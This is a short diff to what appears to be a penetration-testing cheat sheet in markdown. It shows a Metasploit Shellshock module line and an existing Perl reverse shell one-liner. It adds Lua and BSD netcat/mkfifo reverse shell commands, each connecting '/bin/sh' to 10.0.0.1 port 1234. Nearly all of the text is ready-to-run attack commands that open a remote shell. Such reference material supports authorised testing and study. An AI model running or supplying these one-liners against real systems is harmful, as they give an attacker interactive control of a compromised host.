@@ -287,6 +287,10 @@ msf5 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
 
 **Perl:** `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
 
+**Lua:** `lua -e 'os.execute("nc -e /bin/sh 10.0.0.1 1234")'`
+
+**BSD/NetBSD:** `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
+
 
 ### Post-Ex:
 
